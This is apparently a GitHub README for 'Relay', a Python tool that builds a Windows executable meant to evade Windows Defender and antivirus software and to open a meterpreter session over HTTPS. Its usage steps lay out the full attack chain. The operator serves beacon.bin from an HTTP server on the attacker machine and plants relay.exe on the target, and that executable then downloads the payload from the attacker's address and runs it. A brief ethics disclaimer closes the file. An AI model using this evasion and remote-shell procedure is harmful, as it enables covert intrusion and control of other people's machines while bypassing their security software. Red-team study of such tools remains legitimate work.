## 🔒 Relay: Bypassing Antivirus and Firewall Detection Script

## Description

The "Relay" script is a powerful tool designed to generate an executable file that bypasses Windows Defender and establishes a secure connection using meterpreter over HTTPS. This script automates the process of creating a payload that can be used for various purposes, such as penetration testing and security assessments.

✅ Windows Defender, and other security software

## Features

- The generated executable is specifically crafted to evade detection by Windows Defender and other antivirus software.
- Meterpreter over HTTPS: The script establishes a connection using meterpreter, providing a versatile and robust framework for interacting with the target system.
- Encrypted Communication: All communication between the attacker and the target system is encrypted using HTTPS, ensuring confidentiality and integrity of the data exchanged.
- Simple Usage: The script prompts the user to enter their IP address, port, and certificate file, making it easy to customize and generate the payload.

## Usage

1. Run the Python script: `python3 relay.py` and follow the on-screen instructions.
2. Enter your IP address and port, when prompted.
3. The script will generate the `beacon.bin` and an executable file named `relay.exe`.
4. On the attacker machine, navigate to the directory containing `beacon.bin`.
5. Start a simple HTTP server using the command: `python3 -m http.server`.
6. Transfer the `relay.exe` file to the target system.
7. On the target system, open a command prompt and navigate to the directory containing `relay.exe`.
8. Run the following command: `relay.exe <attacker_ip> <attacker_port> beacon.bin`. Replace `<attacker_ip>` and `<attacker_port>` with the IP address and port specified during script execution.
9. The target system will download `beacon.bin` from the HTTP server and execute it, establishing a meterpreter session over HTTPS.

**Note:** Ensure that you have the necessary permissions and legal authorization before using this script for any activities.

## Disclaimer

This script is intended for educational and ethical purposes only. The misuse of this script for any unauthorized activities is strictly prohibited. The author is not responsible for any damage or illegal actions caused by the use of this script.

## License

This project is licensed under the [MIT License](LICENSE).

## Kali
![2](https://github.com/DorArlaki/Relay/assets/107101354/c70f9fb0-1e21-42f9-a21f-b29e31b4141e)

## Target
![1](https://github.com/DorArlaki/Relay/assets/107101354/92d340a3-dc83-4c63-9bcd-7830336bf128)

